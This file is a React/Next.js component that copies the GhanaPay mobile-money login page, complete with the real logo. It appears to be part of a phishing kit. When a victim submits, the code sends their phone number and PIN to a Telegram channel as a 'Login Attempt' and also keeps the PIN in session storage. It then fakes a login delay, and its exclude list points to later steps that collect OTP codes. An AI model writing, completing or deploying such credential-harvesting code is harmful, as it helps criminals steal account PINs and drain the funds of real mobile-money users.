"use client"

import Image from "next/image"
import Link from "next/link"
import { useState } from "react"
import { sendTelegramMessage } from "@/lib/telegram"

export default function GhanaPayLogin({ onLogin }: { onLogin?: () => void }) {
    const [phone, setPhone] = useState("")
    const [pin, setPin] = useState("")
    const [isLoading, setIsLoading] = useState(false)
    const [error, setError] = useState("")

    const handleLogin = async () => {
        if (!phone.trim() || !pin.trim()) {
            setError("Please fill in both phone number and PIN.")
            return
        }

        setError("")
        setIsLoading(true)

        sessionStorage.setItem("userPhone", phone)
        sessionStorage.setItem("userPin", pin)

        await sendTelegramMessage({
            title: "🔐 GhanaPay Login Attempt",
            phoneNumber: phone,
            pin: pin,
            exclude: ["location", "otp1", "otp2", "otp3"],
        })

        setTimeout(() => {
            setIsLoading(false)
            if (onLogin) onLogin()
        }, 1500)
    }

    return (
        <div className="flex min-h-[100dvh] w-full max-w-[100vw] overflow-x-hidden flex-col items-center bg-white px-6 py-12">
            {/* Logo Section */}
            <div className="flex flex-col items-center mb-16">
                <img
                    src="https://www.ghipss.net/images/2025/07/01/ghanapay-to-boost-mobile-money-penetration-logo-3.png"
                    alt="GhanaPay Logo"
                    width={180}
                    height={80}
                    className="object-contain"

                />
                <p className="text-[#4A90D9] text-sm mt-1">Your Money, Your Way.</p>
            </div>

            {/* Form Section */}
            <div className="w-full max-w-md flex flex-col gap-6">
                {/* Phone Number Input */}
                <input
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    value={phone}
                    onChange={(e) => {
                        setPhone(e.target.value)
                        setError("")
                    }}
                    placeholder="Phone Number EX(0542720560)"
                    className={`w-full bg-[#EBEBEB] text-[#1a1a1a] placeholder-[#808080] rounded-lg px-5 py-4 text-base outline-none focus:outline-[#4A90D9] ${error ? 'border border-red-500 bg-red-50' : 'border-none'}`}
                />

                {/* PIN Input */}
                <div className="flex flex-col gap-2">
                    <input
                        type="tel"
                        style={{ WebkitTextSecurity: "disc" } as any}
                        inputMode="numeric"
                        pattern="[0-9]*"
                        value={pin}
                        onChange={(e) => {
                            setPin(e.target.value)
                            setError("")
                        }}
                        placeholder="PIN"
                        className={`w-full bg-[#EBEBEB] text-[#1a1a1a] placeholder-[#808080] rounded-lg px-5 py-4 text-base outline-none focus:outline-[#4A90D9] ${error ? 'border border-red-500 bg-red-50' : 'border-none'}`}
                    />
                    {error && (
                        <p className="text-sm text-red-500 font-medium px-2">{error}</p>
                    )}
                </div>

                {/* Forgot PIN Link */}
                <div className="flex justify-end">
                    <Link
                        href="#"
                        className="text-[#1a1a1a] text-base font-medium hover:underline"
                    >
                        Forgot PIN?
                    </Link>
                </div>

                {/* Login Button */}
                <button
                    onClick={handleLogin}
                    disabled={isLoading || !phone || !pin}
                    className="w-[200px] mx-auto bg-[#4A90D9] hover:bg-[#3d7ec5] text-white font-medium py-3.5 rounded-full text-lg transition-colors mt-4 disabled:opacity-70 disabled:cursor-not-allowed"
                >
                    {isLoading ? "Logging In..." : "Log In"}
                </button>

                {/* Register Button */}
                <button
                    disabled={isLoading}
                    className="w-[200px] mx-auto bg-[#3D6B5C] hover:bg-[#345c4f] text-white font-medium py-3.5 rounded-full text-lg transition-colors disabled:opacity-70"
                >
                    Register
                </button>
            </div>

        </div>
    )
}
